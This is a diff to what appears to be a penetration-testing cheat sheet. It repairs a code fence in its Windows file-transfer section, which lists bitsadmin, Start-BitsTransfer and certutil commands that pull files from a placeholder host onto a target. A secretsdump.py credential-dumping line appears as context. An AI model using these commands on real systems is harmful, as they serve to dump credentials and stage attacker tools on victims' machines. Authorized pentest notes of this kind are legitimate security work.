@@ -366,13 +366,15 @@ secretsdump.py <domain>/<user>:<password>@<IP>
 ## File Transfers
 ### Windows File Transfers
 #### LOLBAS
+  
 ##### Bitsadmin
 ```powershell
 bitsadmin /transfer wcb /priority foreground http://<host>/<file> C:\Users\<User>\Desktop\<file>
 ```
 ```powershell
 Import-Module bitstransfer; Start-BitsTransfer -Source "http://<host>/<file>" -Destination "C:\Users\<User>\Desktop\<file>"
-``
+```
+  
 ##### Certutil
 ```cmd
 certutil.exe -verifyctl -split -f http://<host>/<file>
